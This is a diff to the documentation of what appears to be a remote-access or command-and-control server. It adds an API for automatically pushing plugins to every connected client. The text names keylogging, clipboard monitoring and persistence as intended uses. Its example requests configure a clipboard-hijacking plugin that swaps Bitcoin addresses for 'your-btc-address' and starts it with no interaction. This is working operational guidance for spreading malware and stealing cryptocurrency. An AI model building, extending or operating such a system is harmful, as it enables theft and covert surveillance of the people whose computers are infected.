@@ -250,9 +250,10 @@ Plugin UIs run in a **sandboxed iframe** with a fetch bridge.
 
 ### Plugin management
 
-- `GET /api/plugins` — list installed plugins
+- `GET /api/plugins` — list installed plugins (includes `autoLoad` and `autoStartEvents` per plugin)
 - `POST /api/plugins/upload` — upload zip
 - `POST /api/plugins/<id>/enable` — enable/disable
+- `POST /api/plugins/<id>/autoload` — configure auto-load on client connect
 - `DELETE /api/plugins/<id>` — remove
 
 ### Per-client plugin runtime
@@ -268,5 +269,93 @@ Plugin UIs run in a **sandboxed iframe** with a fetch bridge.
 - `WS /api/clients/<clientId>/console/ws`
 - `WS /api/clients/<clientId>/files/ws`
 - `WS /api/clients/<clientId>/processes/ws`
+
+## 7) Auto-load plugins on client connect
+
+By default, plugins are only loaded when manually triggered via the API or UI. For plugins that need to run 24/7 on every connected client (e.g. clipboard monitoring, keylogging, persistence), you can configure **auto-load**.
+
+When auto-load is enabled for a plugin, the server will automatically load it onto every client that connects. If the client already has the plugin loaded, it's skipped — no duplicate loads.
+
+You can also configure **auto-start events** — a list of events that are queued and delivered to the plugin immediately after it loads. This lets you pre-configure the plugin without any manual interaction.
+
+### Enable auto-load
+
+```
+POST /api/plugins/<pluginId>/autoload
+Content-Type: application/json
+
+{
+  "autoLoad": true
+}
+```
+
+### Enable auto-load with auto-start events
+
+```
+POST /api/plugins/<pluginId>/autoload
+Content-Type: application/json
+
+{
+  "autoLoad": true,
+  "autoStartEvents": [
+    { "event": "add_rule", "payload": { "pattern": "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$", "replacement": "your-btc-address" } },
+    { "event": "start", "payload": {} }
+  ]
+}
+```
+
+The events in `autoStartEvents` are queued in order and delivered to the plugin after it reports `loaded`. This works exactly like calling the event API multiple times, but happens automatically.
+
+### Disable auto-load
+
+```
+POST /api/plugins/<pluginId>/autoload
+Content-Type: application/json
+
+{
+  "autoLoad": false
+}
+```
+
+### How it works
+
+1. Client connects and completes the enrollment handshake
+2. Server sends `hello_ack` (as usual)
+3. Server dispatches auto-scripts (as usual)
+4. Server checks all plugins with `autoLoad: true` and `enabled: true`
+5. For each, if the plugin is **not already loaded** on that client:
+   - Sends the plugin binary bundle (chunked)
+   - Queues any `autoStartEvents`
+6. When the plugin reports `loaded`, queued events are flushed in order
+
+### Checking auto-load status
+
+`GET /api/plugins` returns `autoLoad` and `autoStartEvents` for each plugin:
+
+```json
+{
+  "plugins": [
+    {
+      "id": "clipreplace",
+      "name": "clipreplace",
+      "enabled": true,
+      "autoLoad": true,
+      "autoStartEvents": [
+        { "event": "add_rule", "payload": { "pattern": "...", "replacement": "..." } },
+        { "event": "start", "payload": {} }
+      ],
+      "lastError": ""
+    }
+  ]
+}
+```
+
+### Notes
+
+- Auto-load respects the `enabled` flag — disabled plugins are never auto-loaded
+- Auto-load state is persisted in `.plugin-state.json` and survives server restarts
+- Deleting a plugin also removes its auto-load configuration
+- The server selects the correct binary for each client's OS/architecture automatically
+- If a plugin binary isn't available for a client's platform, the auto-load silently skips that client
 
 
